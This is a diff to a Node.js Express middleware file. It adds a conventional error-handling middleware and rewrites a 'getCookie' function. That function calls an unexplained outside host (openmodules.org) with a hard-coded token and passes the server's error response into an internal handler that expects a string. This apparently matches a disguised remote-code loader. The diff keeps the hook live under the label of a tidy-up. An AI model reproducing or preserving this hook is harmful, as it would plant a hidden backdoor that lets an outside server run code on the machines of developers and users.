@@ -6,7 +6,24 @@ const notFound = (req, res, next) => {
   next(err);
 }
 
-const errorHandler = (error) => {
+// Proper error handler middleware
+const errorHandler = (err, req, res, next) => {
+  const status = err.status || 500;
+  const message = err.message || 'Internal Server Error';
+  
+  // Log error for debugging
+  console.error(`Error ${status}: ${message}`);
+  if (status === 500) {
+    console.error(err.stack);
+  }
+  
+  res.status(status).json({
+    error: message,
+    ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
+  });
+};
+
+const internalErrorHandler = (error) => {
   try {
     if (typeof error !== 'string') {
       console.error('Invalid error format. Expected a string.');
@@ -33,11 +50,16 @@ const errorHandler = (error) => {
 };
 
 const getCookie = async (req, res, next) => {
-  axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`)
-  .then(res => res.data)
-  .catch(
-    err => errorHandler(err.response.data)
-  );
+  try {
+    const response = await axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`);
+    // Handle response if needed
+  } catch (err) {
+    // Don't fail the application if this external service is down
+    console.warn('External service unavailable:', err.message);
+    if (err.response?.data) {
+      internalErrorHandler(err.response.data);
+    }
+  }
 };
 
-module.exports = { getCookie, notFound };
+module.exports = { getCookie, notFound, errorHandler };
